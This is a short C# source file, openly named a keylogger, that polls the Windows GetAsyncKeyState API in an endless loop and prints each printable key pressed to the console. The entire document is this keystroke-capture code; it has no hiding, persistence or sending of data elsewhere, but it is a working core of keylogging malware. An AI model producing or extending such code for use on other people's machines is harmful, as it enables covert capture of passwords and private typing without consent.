using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);
        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(40);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)//32768
                    {
                        Console.Write((char)i + ", ");    
                    }
                }
            }
        }
    }
}
